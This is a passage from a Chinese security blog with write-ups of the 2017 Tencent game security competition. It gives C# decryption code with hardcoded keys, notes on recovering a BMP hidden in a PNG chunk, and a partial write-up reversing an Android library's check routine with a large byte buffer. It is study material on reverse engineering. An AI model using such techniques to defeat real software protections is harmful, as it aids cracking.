class="line">	        &#125;;</div><div class="line">            byte[] array2 = new byte[0];</div><div class="line">            uint[] array4 = new uint[]</div><div class="line">	        &#123;</div><div class="line">		        <span class="number">0</span>,</div><div class="line">		        <span class="number">0</span></div><div class="line">	        &#125;;</div><div class="line">            uint[] array5 = new uint[]</div><div class="line">	        &#123;</div><div class="line">		        <span class="number">0</span>,</div><div class="line">		        <span class="number">0</span></div><div class="line">	        &#125;;</div><div class="line"></div><div class="line">            for (int k = num-4; k &gt;=12; k -= 8)</div><div class="line">            &#123;</div><div class="line">               array4[1] = ConvertBytesToUInt(input, k );</div><div class="line">               array4[0] = ConvertBytesToUInt(input, k-4);</div><div class="line">               array4 = DeCode(array4, array);</div><div class="line">               array4[1] ^= ConvertBytesToUInt(input, k -8);</div><div class="line">               array4[0] ^= ConvertBytesToUInt(input, k - 12);</div><div class="line">               array2 = CombineBytes2(array2, ConvertUIntToBytes(array4[1]));</div><div class="line">               array2 = CombineBytes2(array2, ConvertUIntToBytes(array4[0]));</div><div class="line">               </div><div class="line">            &#125;</div><div class="line">            return array2;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        private static uint[] DeCode(uint[] v, uint[] k)</div><div class="line">        &#123;</div><div class="line">            uint num = v[0];</div><div class="line">            uint num2 = v[1];</div><div class="line">            uint num3 = 0u;</div><div class="line">            uint num4 = Convert.ToUInt32(Math.Floor((Math.Pow(5.0, 0.5) - 1.0) * Math.Pow(2.0, 31.0)));</div><div class="line">            uint num5 = 32u;</div><div class="line">            while (num5-- &gt; <span class="number">0</span>u)</div><div class="line">            &#123;</div><div class="line">                num3 += num4;</div><div class="line">            &#125;</div><div class="line">            num5 = 32u;</div><div class="line">            while (num5-- &gt; <span class="number">0</span>u)</div><div class="line">            &#123;</div><div class="line">                num2-= (num &lt;&lt; 4 ^ (num &gt;&gt; 5) + num ^ num3 + k[(int)((ushort)(num3 &gt;&gt; 11 &amp; 3u))]);</div><div class="line">                num3 -= num4;</div><div class="line">                num -= (num2 &lt;&lt; 4 ^ (num2 &gt;&gt; 5) + num2 ^ num3 + k[(int)((ushort)(num3 &amp; 3u))]);</div><div class="line">               Console.WriteLine(" &#123;0&#125; &#123;1&#125; &#123;2&#125;.", num, num2, num3);</div><div class="line">                </div><div class="line">            &#125;</div><div class="line">            return new uint[]</div><div class="line">	&#123;</div><div class="line">		num,</div><div class="line">		num2</div><div class="line">	&#125;;</div><div class="line">        &#125;</div><div class="line">        public static byte[] Encrypt(byte[] input)</div><div class="line">        &#123;</div><div class="line">            uint[] array = new uint[]</div><div class="line">	&#123;</div><div class="line">		<span class="number">1423373290</span>u,</div><div class="line">		<span class="number">363609949</span>u,</div><div class="line">		<span class="number">512121596</span>u,</div><div class="line">		<span class="number">1703126449</span>u</div><div class="line">	&#125;;</div><div class="line">            byte[] array2 = new byte[0];</div><div class="line">            int num = input.Length;</div><div class="line">            byte[] array3 = new byte[8];</div><div class="line">            int num2 = 7 - num % 8;</div><div class="line">            array3[0] = (byte)num2;</div><div class="line">            for (int i = 0; i &lt; num2; i++)</div><div class="line">            &#123;</div><div class="line">                array3[i + 1] = (byte)(200 + num2 - i);</div><div class="line">            &#125;</div><div class="line">            for (int j = 0; j &lt; 7 - num2; j++)</div><div class="line">            &#123;</div><div class="line">                array3[j + num2 + 1] = input[j];</div><div class="line">            &#125;</div><div class="line">            uint[] array4 = new uint[]</div><div class="line">	&#123;</div><div class="line">		ConvertBytesToUInt(array3, <span class="number">0</span>),</div><div class="line">		ConvertBytesToUInt(array3, <span class="number">4</span>)</div><div class="line">	&#125;;</div><div class="line">            array4[0] = (array4[0] ^ array[0]);</div><div class="line">            array4[1] = (array4[1] ^ array[2]);</div><div class="line">            array4 = Code(array4, array);</div><div class="line">            array2 = CombineBytes(array2, ConvertUIntToBytes(array4[0]));</div><div class="line">            array2 = CombineBytes(array2, ConvertUIntToBytes(array4[1]));</div><div class="line">            for (int k = 7 - num2; k &lt; num; k += 8)</div><div class="line">            &#123;</div><div class="line">                array4[0] ^= ConvertBytesToUInt(input, k);</div><div class="line">                array4[1] ^= ConvertBytesToUInt(input, k + 4);</div><div class="line">                array4 = Code(array4, array);</div><div class="line">                array2 = CombineBytes(array2, ConvertUIntToBytes(array4[0]));</div><div class="line">                array2 = CombineBytes(array2, ConvertUIntToBytes(array4[1]));</div><div class="line">            &#125;</div><div class="line">            return array2;</div><div class="line">        &#125;</div><div class="line">        private static byte[] ConvertUIntToBytes(uint input)</div><div class="line">        &#123;</div><div class="line">            return new byte[]</div><div class="line">	            &#123;</div><div class="line">		            (byte)(<span class="selector-tag">input</span> &amp; <span class="number">255</span>u),</div><div class="line">		            (byte)(<span class="selector-tag">input</span> &gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>u),</div><div class="line">		            (byte)(<span class="selector-tag">input</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>u),</div><div class="line">		            (byte)(<span class="selector-tag">input</span> &gt;&gt; <span class="number">24</span> &amp; <span class="number">255</span>u)</div><div class="line">	            &#125;;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        private static uint ConvertBytesToUInt(byte[] <span class="selector-tag">input</span>, int pos)</div><div class="line">        &#123;</div><div class="line">            uint num = (uint)input[pos];</div><div class="line">            num += (uint)((uint)input[pos + 1] &lt;&lt; 8);</div><div class="line">            num += (uint)((uint)input[pos + 2] &lt;&lt; 16);</div><div class="line">            return num + (uint)((uint)input[pos + 3] &lt;&lt; 24);</div><div class="line">        &#125;</div><div class="line">        private static byte[] CombineBytes(byte[] bytes1, byte[] bytes2)</div><div class="line">        &#123;</div><div class="line">            byte[] array = new byte[bytes1.Length + bytes2.Length];</div><div class="line">            Buffer.BlockCopy(bytes1, 0, array, 0, bytes1.Length);</div><div class="line">            Buffer.BlockCopy(bytes2, 0, array, bytes1.Length, bytes2.Length);</div><div class="line">            return array;</div><div class="line">        &#125;</div><div class="line">        private static byte[] CombineBytes2(byte[] bytes1, byte[] bytes2)</div><div class="line">        &#123;</div><div class="line">            byte[] array = new byte[bytes1.Length + bytes2.Length];</div><div class="line">            Buffer.BlockCopy(bytes2, 0, array, 0, bytes2.Length);</div><div class="line">            Buffer.BlockCopy(bytes1, 0, array, bytes2.Length, bytes1.Length);</div><div class="line">            return array;</div><div class="line">        &#125;</div><div class="line">        private static uint[] Code(uint[] v, uint[] k)</div><div class="line">        &#123;</div><div class="line">            uint num = v[0];</div><div class="line">            uint num2 = v[1];</div><div class="line">            uint num3 = 0u;</div><div class="line">            uint num4 = Convert.ToUInt32(Math.Floor((Math.Pow(5.0, 0.5) - 1.0) * Math.Pow(2.0, 31.0)));</div><div class="line">            uint num5 = 32u;</div><div class="line">            while (num5-- &gt; <span class="number">0</span>u)</div><div class="line">            &#123;</div><div class="line">                num += (num2 &lt;&lt; 4 ^ (num2 &gt;&gt; 5) + num2 ^ num3 + k[(int)((ushort)(num3 &amp; 3u))]);</div><div class="line">                num3 += num4;</div><div class="line">                num2 += (num &lt;&lt; 4 ^ (num &gt;&gt; 5) + num ^ num3 + k[(int)((ushort)(num3 &gt;&gt; 11 &amp; 3u))]);</div><div class="line">               <span class="comment">// Console.WriteLine(" &#123;0&#125; &#123;1&#125; &#123;2&#125;.", num, num2, num3);</span></div><div class="line">            &#125;</div><div class="line">            return new uint[]</div><div class="line">	&#123;</div><div class="line">		num,</div><div class="line">		num2</div><div class="line">	&#125;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="0x3-最后的战役"><a href="#0x3-最后的战役" class="headerlink" title="0x3 最后的战役"></a>0x3 最后的战役</h3><p>这一问好开放，只能靠脑洞了。解密出来的是一个藏着数据的png。修复头之后提示格式问题，去熟悉格式。<br>又不会，直接链接如下，一起学习之：<br><a href="https://wenku.baidu.com/view/a991270f76c66137ee061967.html" target="_blank" rel="external">https://wenku.baidu.com/view/a991270f76c66137ee061967.html</a><br><a href="https://www.ietf.org/rfc/rfc1951.txt" target="_blank" rel="external">https://www.ietf.org/rfc/rfc1951.txt</a><br><a href="http://www.sweetscape.com/010editor/repository/files/PNG.bt" target="_blank" rel="external">http://www.sweetscape.com/010editor/repository/files/PNG.bt</a></p>
<p>发现第4个CHUNK 有问题，感觉这个就是目标数据。然后去修了很久，卡了很久这里。找了几个png的图片对照，发现这里多了很多FF，完全没有的东西，一开始还以为，然后各种找压缩算法，zlib，lz77的各种衍生算法，都没能压缩对。<br>后来找一些关于图片的分析，查到一个图像隐写，然后继续查资料，学习，一直纠结于这个东西，当然没有结果。<br>最后发现是位图格式，bmp，我倒。然后就OK了。<br>其实题目有提示，我想当然的理解错了。</p>
<p>整个比赛就结束了，谢谢观看，不足之处请看官斧正！</p>
<p>2017.7.23</p>
<p>By Ericky</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/07/15/2017腾讯游戏安全技术竞赛 Round 2 第一题详细题解/">
  <time datetime="2017-07-15T15:00:00.000Z">
    2017-07-15
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/07/15/2017腾讯游戏安全技术竞赛 Round 2 第一题详细题解/">2017腾讯游戏安全技术竞赛 Round 2 第一题详细题解</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从第一题题目来看，感觉这次的题目都出得很灵活，主要考的是密码学这一块的东西。这道题目也不例外，由于不是科班出身，根本没有接触过密码学，那只能现学现卖，其中踩了不少坑，但是不要怕，我们可以慢慢爬出来再继续踩。初一看这道题后面的“双重保镖”很是霸气，很容易被吓跑，但是仔细认真做了之后会发现，Oh，hash碰撞也不是那么难的。好了，废话扯多了估计要被拉黑，我选择的依旧是安卓的题目，下面进入正题，我将此题分成两大部分，主要阐述这两大部分。</p>
<h3 id="0x1-拉开帷幕"><a href="#0x1-拉开帷幕" class="headerlink" title="0x1 拉开帷幕"></a>0x1 拉开帷幕</h3><p>官方具体表演如下：<br><img src="/img/1499949598096.jpg" alt="enter description here"></p>
<ol>
<li>判断指定路径有没有so，没有或者是打开失败就跪。    </li>
<li>找zapus_get符号，符号表里没有就跪。</li>
<li>有了的话，把该函数初始化的指针带进到图中的sub_F90函数，然后开始计算。</li>
<li>小插曲，这里说一下这个题目第一次发的有一个bug，解密后的代码与固定两个字符串的指针进行了比较，导致每次对比的值是变的，我做到这里的时候怀疑了一下人生。what？比较的值还是变的？还不能改程序内存？在心中无限崩溃循环中还好官网出来及时修补了bug。<br>计算过程如下:</li>
</ol>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">unsigned char input[] = "1234567890abcdef";</div><div class="line">unsigned char tmp;</div><div class="line">for ( j = 0; (unsigned int) j &lt; 0x80; j++ )</div><div class="line">&#123;</div><div class="line">	tmp = 0;</div><div class="line">	for ( k = 0; (unsigned int) k &lt; 0x80; ++k )</div><div class="line">	&#123;</div><div class="line">		tmp = ((((signed int)(unsigned char)buffer[16 * j + k / 8] &gt;&gt; k % 8) &amp; ((signed int)*( (unsigned char *) input + k / 8) &gt;&gt; (7 - k % 8) ) ) ^ tmp) &amp; 1;	</div><div class="line">	&#125;</div><div class="line">	s[j/8] |= tmp &lt;&lt; (7 - j % 8);</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>实际上第一步要找出这段算法的逆运算。程序中有一个buffer，简算过后如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unsigned char buffer[] =&#123;0x44,0x88,0x7d,0x38,0x6d,0x08,0xae,0xba,0xbc,0x0e,0xf0,0xbf,0xd1,0xda,0x27,0x1e,0x21,0x8f,0x49,0xcb,0x4d,0x5d,0x3c,0x39,0x45,0x85,0x3e,0xdd,0x40,0x07,0x85,0x6c,0x51,0x67,0x78,0xb9,0xad,0xc8,0xa6,0xaf,0x97,0x5f,0xcd,0xb5,0xe1,0x35,0xc2,0x48,0x3f,0xad,0x6c,0x04,0x50,0xec,0xe3,0x2c,0x66,0xc1,0x04,0xf9,0x9c,0x43,0x02,0xd4,0x8e,0x09,0x41,0xb6,0x3c,0x75,0xce,0xec,0x1b,0x03,0xc6,0xb9,0x17,0x7f,0x38,0x0d,0x19,0xd9,0xa2,0x42,0xc8,0x6b,0x19,0xaa,0x2f,0x6a,0xae,0xfa,0xe0,0x6e,0x29,0x4c,0x8c,0x1e,0x1b,0x7d,0x9a,0x4c,0xb5,0x23,0x6b,0xcf,0x65,0x6c,0xe3,0x25,0xd4,0x67,0x08,0xf1,0x62,0x7b,0x10,0x8d,0xeb,0xd8,0x24,0xc9,0xc5,0x4f,0x04,0x75,0xcb,0xb5,0xb3,0xa4,0xd3,0x01,0xb4,0x78,0x70,0x82,0xad,0x52,0x72,0x59,0x95,0x30,0x47,0x0c,0x0b,0xf7,0xf4,0xde,0x3c,0xcc,0x82,0xf7,0x9f,0x6d,0x6b,0xe8,0x6c,0x07,0xaf,0x0c,0xe5,0xd3,0x09,0xb5,0xc5,0x4f,0xd6,0xee,0x0e,0x51,0x31,0xa5,0xbe,0x3c,0x52,0x45,0x31,0x97,0xa0,0xc2,0x0e,0xce,0xf5,0x7b,0xaa,0x21,0xbb,0xf9,0x2c,0x2b,0x37,0x1b,0x32,0x91,0xad,0xe8,0xd0,0xe3,0xbb,0xe2,0x2b,0xb9,0x37,0xc3,0xa8,0xec,0x6a,0xa7,0x13,0xbe,0xd5,0x62,0xa8,0x32,0x78,0xd0,0x82,0x08,0x2c,0xe4,0xf7,0xbf,0x92,0x87,0x2a,0x05,0xa6,0x05,0x4b,0x44,0x24,0xea,0xcf,0xf2,0x4b,0x49,0x54,0x2d,0x20,0xda,0x4d,0x28,0xe0,0x9c,0x26,0x1a,0xcd,0x26,0x97,0xf3,0x9f,0x9e,0xe6,0xdc,0xf1,0xd5,0x6e,0x64,0xb6,0x6f,0x57,0xff,0x10,0xc3,0x30,0x73,0xb7,0x91,0x77,0x46,0x22,0x5b,0x6d,0x6d,0xd1,0xef,0x0f,0xd3,0xee,0x73,0x71,0x99,0x2a,0xbf,0x77,0x92,0x78,0xf2,0xb0,0x31,0xb5,0x53,0x01,0x43,0xe5,0xcd,0x8e,0x88,0x3e,0x8d,0x46,0xa3,0x8d,0x82,0x1d,0x93,0x4f,0x49,0x4e,0xac,0x1f,0xde,0xb3,0xec,0x45,0x79,0x8e,0x7c,0xb6,0x40,0x8c,0x42,0x7b,0xee,0xc7,0x27,0x62,0x34,0xbb,0x54,0xd9,0x8e,0x67,0xeb,0x16,0x62,0x4a,0xa7,0x16,0xfd,0xe8,0x6e,0x2a,0x0c,0x93,0x4d,0x17,0xe0,0x45,0x8e,0x5f,0x5f,0x34,0x5d,0x72,0x28,0x24,0xc8,0x7d,0x9c,0x68,0x42,0x50,0x40,0x62,0x5b,0x8c,0x2c,0xd6,0x17,0x2a,0x34,0x75,0xd6,0x92,0xe6,0xfe,0xa7,0x81,0xc8,0x38,0x94,0x36,0xee,0x30,0x14,0x29,0x7c,0x21,0x45,0x8d,0xcb,0x3f,0x94,0xee,0x60,0x67,0x26,0xcb,0xa1,0x57,0x1d,0xd3,0xe5,0x93,0x15,0xae,0x7a,0xf1,0xe4,0x79,0x93,0x01,0x58,0x90,0xcd,0x42,0xb7,0xf4,0x3c,0xf3,0x09,0x57,0x3b,0xda,0x7a,0xe7,0xb8,0xae,0x87,0x34,0xc7,0xf2,0xe8,0xb6,0x4f,0xf7,0x5d,0x43,0xdd,0x7f,0xd2,0x11,0x29,0x5c,0xf0,0xdd,0x0f,0xe0,0xef,0xad,0x14,0x46,0x44,0x4f,0xb8,0x67,0x28,0xa2,0xb1,0x79,0x5c,0xd4,0xa0,0x76,0x21,0x67,0x8a,0x91,0x7c,0x69,0xf1,0x22,0x22,0x8e,0x14,0xa1,0x41,0x2c,0x54,0x1f,0x39,0x65,0x11,0xcd,0x60,0xff,0x8a,0x44,0x7d,0xc9,0x03,0x01,0xab,0xe2,0x1c,0xed,0x9e,0x2f,0xec,0xe0,0xee,0x92,0xdb,0x38,0xb8,0x9d,0xbb,0x5f,0x35,0x84,0x95,0x06,0xe6,0x2e,0x2a,0x99,0x52,0xcf,0x72,0xdb,0xf8,0x88,0x1f,0xd8,0x1f,0x41,0x63,0xa7,0xb7,0x65,0x3d,0x87,0x57,0x72,0x21,0x77,0xcd,0x7e,0xc8,0x05,0xf5,0xeb,0xc8,0xb7,0x1b,0x20,0x27,0x50,0x67,0xd8,0xed,0x07,0x00,0x87,0xa9,0x52,0x47,0x92,0x57,0x54,0x9f,0x29,0x84,0x69,0xe2,0xc9,0x91,0xf1,0x78,0xe7,0xc8,0xd3,0xaa,0x17,0x75,0xed,0xde,0x1f,0xc8,0x98,0xba,0xf8,0x8b,0x53,0x01,0x47,0x49,0x67,0xde,0xbf,0xb8,0xd6,0xa9,0xe9,0x1e,0xd3,0x05,0xa7,0xfa,0xa8,0x79,0x4a,0xb7,0x68,0x53,0xb2,0x60,0x05,0xbe,0x79,0xf6,0x44,0xd7,0x93,0xbb,0x8b,0xa2,0x1a,0xcd,0x46,0x23,0xdb,0xa2,0xf7,0xbd,0x48,0x52,0x1f,0x35,0xd2,0x23,0x8f,0x05,0x0b,0x94,0xc6,0x27,0xab,0xee,0x38,0x33,0x9f,0x9a,0xa5,0x6f,0x65,0x58,0xba,0xa2,0xe6,0x06,0x0f,0xb1,0x6f,0x39,0xdf,0x96,0x4f,0x4d,0x30,0xe0,0x78,0x5f,0x9c,0x87,0x88,0x11,0xe0,0x43,0x73,0x1d,0x71,0xb7,0xcc,0x0d,0xf9,0x47,0x62,0xb8,0xb5,0x94,0x27,0x08,0x77,0x8f,0xe4,0x03,0xb5,0xb2,0x0d,0xd8,0x13,0x10,0x69,0x34,0x4f,0xc8,0x87,0x7b,0x87,0xec,0x41,0x7c,0x06,0x62,0xd2,0xf7,0xc0,0x0f,0x65,0x44,0x28,0xd0,0xfb,0x93,0x16,0xb4,0x35,0x71,0x9d,0xa2,0xba,0x27,0x91,0x5f,0xd7,0x59,0x1b,0xd0,0x46,0xf2,0x7e,0x04,0x81,0x8a,0x56,0x71,0xc8,0x74,0x68,0xe9,0x2b,0x3f,0x2a,0x40,0xde,0x12,0xe4,0x62,0x06,0x81,0xe2,0xd3,0x00,0xa0,0xea,0xed,0xcb,0xd9,0x82,0xd8,0xc3,0x38,0xac,0x27,0x29,0xc8,0x62,0xad,0xaf,0xb6,0x4d,0xd9,0x01,0xae,0x26,0xc3,0x36,0x41,0xad,0x2d,0x6f,0xd4,0x3b,0xc8,0x70,0x1f,0x32,0x38,0x87,0xa4,0xea,0x48,0x66,0xf3,0x1e,0x22,0xaf,0x93,0xb5,0x34,0x3b,0xaa,0x41,0xbc,0x44,0x84,0x2c,0xd4,0xf2,0xa0,0x7c,0x60,0xad,0x64,0xe1,0x6f,0xb3,0xfe,0xc4,0xd3,0x4e,0x5f,0x73,0x7d,0xc9,0x72,0x9d,0xfc,0x00,0x60,0xec,0xe0,0x79,0xd0,0x04,0x1a,0x51,0xaa,0x40,0xc1,0x90,0x8e,0xbe,0xc2,0x65,0x25,0x57,0xd4,0x46,0x2f,0xfa,0x6f,0xc9,0xa5,0xa7,0x33,0x1a,0xe7,0x17,0x79,0xcf,0x18,0x2e,0x13,0x19,0x95,0x07,0x6a,0x45,0x51,0xa6,0x9c,0xf9,0x61,0xa0,0x63,0xc3,0x37,0x6e,0x5f,0x97,0xcb,0xea,0xa9,0x4b,0xac,0xab,0x17,0xcb,0x6f,0xfc,0xb8,0xc7,0xb3,0x8c,0x2b,0x09,0xef,0x57,0xac,0x03,0x6c,0x8f,0xd4,0x9f,0x65,0x34,0x5f,0xcd,0x6f,0x7d,0x37,0x1e,0x66,0x01,0xda,0x22,0x89,0x55,0x4e,0xf2,0xc9,0xf2,0x44,0x4b,0x23,0x3e,0x7c,0x3d,0xc8,0x32,0x5f,0xec,0xee,0x17,0x1a,0xfa,0xe6,0x97,0x82,0x0e,0xfe,0x35,0x4c,0x3c,0xc8,0x21,0x1e,0xa0,0x4b,0x26,0xdd,0x5a,0x39,0xce,0x6a,0xbc,0x7e,0x9f,0xd5,0x03,0xfb,0x6f,0x98,0x97,0xce,0x8b,0xec,0x60,0x93,0x33,0x27,0x19,0xbf,0xba,0xfb,0x3f,0xb8,0x04,0x92,0xec,0x5e,0xec,0x82,0x00,0x7e,0x1e,0xe6,0xae,0xac,0x51,0x5e,0x55,0x72,0x85,0x04,0xdd,0xeb,0x1c,0xe5,0x64,0x38,0xc4,0x24,0x51,0xaf,0xbe,0x47,0x16,0xfc,0xc2,0x97,0x84,0x11,0x24,0x5b,0x2f,0xaf,0xe6,0x89,0x32,0xe7,0xa4,0xda,0x1f,0x24,0x8b,0x6f,0xc6,0xc2,0x5d,0xa1,0x96,0x4f,0x04,0xb8,0xb2,0x97,0x17,0xf9,0x2e,0x4f,0x71,0x6d,0xd9,0x0c,0x3c,0xe5,0x7f,0xd0,0x62,0x91,0x35,0x84,0xc9,0x07,0xa3,0xfc,0xfc,0x46,0x2c,0x4a,0x02,0x6a,0x4c,0xe0,0xf3,0x32,0xe7,0xf7,0x0a,0x1a,0x4d,0x87,0xfe,0xc9,0xd9,0x89,0x74,0xf7,0x47,0xe3,0x93,0x6b,0x7b,0xfe,0x3a,0xd4,0x50,0x3a,0x3d,0x9f,0x32,0x1c,0x1d,0x2e,0x73,0x62,0x4e,0x49,0x55,0xe3,0x8a,0x2f,0xe9,0x1e,0x3b,0x6f,0xb2,0x15,0x40,0x1d,0xe9,0x29,0x7c,0x16,0x7c,0x49,0x5e,0x18,0xa2,0xbd,0x11,0x3a,0xc4,0x17,0xa2,0xc4,0xe7,0x8b,0x60,0x5a,0x0e,0x52,0x1a,0xc4,0x49,0xf9,0x83,0x41,0x6e,0x22,0x3f,0xf8,0x9a,0x38,0x64,0xe4,0xcc,0x9b,0xf9,0x67,0xf1,0x3b,0x63,0x4f,0x2e,0xe5,0x1e,0x77,0xb9,0x78,0xa2,0x7e,0x4f,0x31,0x47,0x79,0xe4,0x92,0x71,0x41,0xcd,0x3d,0x60,0x02,0x85,0x3d,0x63,0xd1,0xd5,0xb5,0x51,0xbe,0xaa,0xf8,0x38,0xdc,0xda,0xe5,0x29,0x3d,0x58,0x0d,0xd1,0xa2,0x61,0x83,0x89,0xfd,0x24,0x56,0x1b,0x39,0xc2,0x01,0x47,0xaf,0x34,0x66,0x57,0x4d,0x8d,0x85,0x7a,0x90,0x4b,0x2f,0xaf,0xd5,0x92,0x1c,0xcc,0x7e,0xdf,0xc4,0x7f,0xc1,0x9b,0x4f,0x90,0xf1,0x08,0x66,0x5c,0xec,0x85,0x48,0xbd,0x17,0xcd,0x5a,0x24,0x80,0xe7,0x57,0x29,0x4b,0x74,0x52,0xce,0xc5,0x31,0xd0,0xf3,0x22,0xfe,0x75,0x5c,0x5e,0x55,0xd7,0xed,0x11,0xd8,0xae,0x52,0x53,0x66,0x58,0xe1,0x2a,0x24,0xf8,0x51,0x48,0x9d,0x6e,0x24,0x94,0x6b,0xaa,0x80,0xd6,0x0d,0xe2,0x3a,0x12,0x83,0xa2,0x53,0x74,0x2b,0x64,0x27,0x2b,0x53,0xbf,0x1d,0x50,0x3d,0x51,0xf0,0x99,0x9a,0xc4,0xbd,0xd2,0x38,0x40,0xa6,0x38,0x30,0xcb,0xd5,0x03,0x99,0xa0,0x89,0x6d,0x52,0x70,0x5c,0x5a,0xb0,0x66,0xce,0x0c,0xa9,0xfb,0xd7,0xf0,0x86,0xc6,0x46,0xb7,0xcc,0x72,0x3d,0xcc,0xaf,0xdd,0x3c,0x2f,0xc6,0x77,0x6b,0x3e,0xfc,0x1d,0xb7,0x6d,0x9b,0x75,0x0c,0xea,0x6f,0x1b,0x96,0xf3,0xfd,0x36,0x46,0x77,0x09,0x10,0xef,0xf3,0x8d,0x54,0x51,0x92,0x33,0x67,0xc4,0x02,0xf5,0x40,0xed,0xfd,0x36,0x97,0x15,0x5b,0xec,0xb8,0xfc,0x29,0x4b,0x02,0x78,0x85,0x60,0x29,0x12,0x0e,0xe8,0x43,0x2b,0x23,0xca,0x5c,0x3f,0xb0,0x03,0x3d,0x56,0xba,0x1d,0x34,0x7c,0xbd,0x11,0x55,0x06,0xfa,0xd5,0xc5,0x80,0x28,0x2b,0x92,0x66,0x28,0x36,0xba,0xc6,0x3b,0x99,0x4e,0x82,0xd2,0xfe,0x44,0x6e,0x35,0x8a,0x3d,0xf9,0xd1,0xd1,0x8f,0x13,0x08,0xc1,0xfb,0xd8,0xc3,0x32,0x9b,0xc6,0x95,0xdd,0xef,0x5d,0xd2,0x0d,0xc4,0x7a,0xf7,0x1b,0xf2,0x69,0x7d,0x04,0x69,0x8f,0x04,0x83,0x79,0xd9,0x15,0x19,0x3c,0xae,0x0c,0xdd,0xc4,0x0d,0x81,0xed,0xef,0xfa,0x43,0x67,0xff,0xc8,0xa9,0x5f,0xfb,0xa5,0xb3,0xa0,0x64,0x03,0xe0,0x71,0x99,0x69,0xab,0x6d,0x46,0x65,0xc2,0xc2,0x58,0x43,0xc7,0x9c,0x4a,0x3a,0x8a,0x1a,0x1a,0xcb,0x6b,0x34,0x16,0x4f,0xdb,0xc4,0x5f,0xc4,0x2f,0x5e,0x06,0x03,0xaf,0xd2,0xe8,0x2b,0x56,0x23,0x8d,0xd3,0xf6,0xb5,0x71,0x00,0x8e,0x15,0x8d,0xbb,0xd3,0xbe,0x90,0x5c,0xee,0x9b,0xa7,0xfc,0x4d,0xa0,0x0d,0x71,0xb0,0x16,0xfa,0x03,0x36,0x14,0x4e,0xd2,0x4e,0xfb,0xed,0xd2,0x60,0x6d,0xaf,0xb0,0x7a,0x2c,0xf3,0x3f,0x87,0xf4,0xf7,0xc6,0xaa,0x6b,0xcf,0x95,0xca,0x47,0x8d,0x4d,0x9c,0xd6,0xc4,0x1c,0x62,0x18,0x77,0x1a,0x38,0xd4,0x37,0x95,0x45,0xcd,0xeb,0x08,0xc3,0xd7,0x29,0x31,0x25,0xc0,0x74,0xaf,0x2b,0x43,0x4c,0x50,0xf9,0x4b,0x75,0x2e,0x52,0xa8,0xbf,0x2f,0xa3,0xc2,0xc2,0x61,0xc7,0x11,0x7a,0xc4,0x32,0x04,0xcf,0x47,0x07,0xe8,0xa2,0x63,0x04,0xec,0x97,0x46,0xc1,0xd0,0x64,0x42,0xe6,0x52,0x22,0x44,0x14,0xe1,0x79,0xda,0x23,0xe0,0xbe,0x35,0x54,0x2c,0x95,0x6a,0x4c,0x0d,0x07,0xb4,0x42,0xbc,0x80,0xa1,0x11,0xde,0xbd,0x23,0x17,0x17,0x06,0xf0,0xd0,0x63,0x17,0xe5,0x9f,0x19,0x8f,0x32,0xf1,0x32,0x8f,0x8a,0x13,0xe3,0xf5,0xa0,0x26,0x2d,0x79,0x2a,0x57,0x02,0x85,0x20,0x63,0x21,0xa7,0xd1,0x8e,0x41,0x95,0xeb,0x99,0x3a,0x85,0x8a,0x4e,0x2a,0x4f,0xbf,0x9b,0xe1,0x85,0xda,0xa5,0x2e,0x1c,0x4f,0x15,0x37,0xae,0xdf,0x7f,0x8f,0x5b,0x6a,0x1a,0xd6,0xf3,0xb1,0xfc,0x34,0x14,0xa5,0x26,0x3a,0xad,0x45,0xca,0x94,0x62,0xdf,0x04,0xc2,0xab,0x6e,0x9b,0xe6,0x36,0x37,0xdc,0x17,0x11,0x69,0x88,0x75,0xe8,0x59,0x70,0x63,0x7b,0x8c,0x60,0x01,0x79,0x72,0x20,0xa0,0x4b,0x53,0x49,0xf9,0x71,0xe5,0x5f,0x7a,0x90,0xa6,0x1d,0xb8,0xab,0x23,0xf7,0xac,0x53,0x35,0x3a,0x00,0x31,0x0e,0x40,0x14,0x91,0x96,0x11,0xbf,0x93,0x5d,0x59,0x7c,0x73,0xe4,0xcc,0xa3,0xa9,0x4e,0x07,0x27,0xca,0xa1,0xc2,0x14,0x9f,0x1b,0xbe,0x06,0x72,0x5f,0x34,0x04,0x7e,0x1f,0x45,0x74,0x1a,0x02,0x94,0xde,0xf7,0x73,0x61,0x3a,0x59,0x22,0x67,0x8e,0xe5,0xd5,0x91,0xcd,0x03,0x22,0xd6,0x52,0xc8,0x3c,0xdc,0xf5,0x26,0x12,0xd0,0x32,0x3c,0x33,0xe7,0xdb,0x3e,0x8d,0xb6,0x06,0x1b,0x24,0x22,0xec,0x2a,0xcb,0xa8,0x07,0x39,0x31,0xfa,0x55,0x20,0x43,0x5d,0x30,0x4f,0x14,0xc9,0x8f,0x29,0x31,0xcf,0x47,0x90,0xd8,0xe2,0x90,0x5b,0x58,0x1a,0x04,0xfa,0xd0,0xf5,0xb5,0xa4,0x9a,0xc5,0x44,0x9f,0xad,0x65,0xbc,0x09,0xfd,0xcb,0xb6,0xc1,0xb8,0xe9,0x90,0xba,0x40,0xc7,0x46,0x1a,0x56,0x2e,0x4c,0x65,0x11,0xb9,0x91,0xab,0x08,0xff,0x3e,0x1a,0xc3,0x5a,0xc2,0x91,0xc0,0x2a,0xee,0x09,0xc5,0x81,0x26,0x30,0xc6,0xe4,0x5a,0x62,0x33,0xb3,0xd8,0xd4,0x22,0x98,0xaf,0x51,0x7c,0xc4,0x75,0x88,0x7a,0xf0,0xb1,0x19,0xd4,0x72,0x10,0x94,0x16,0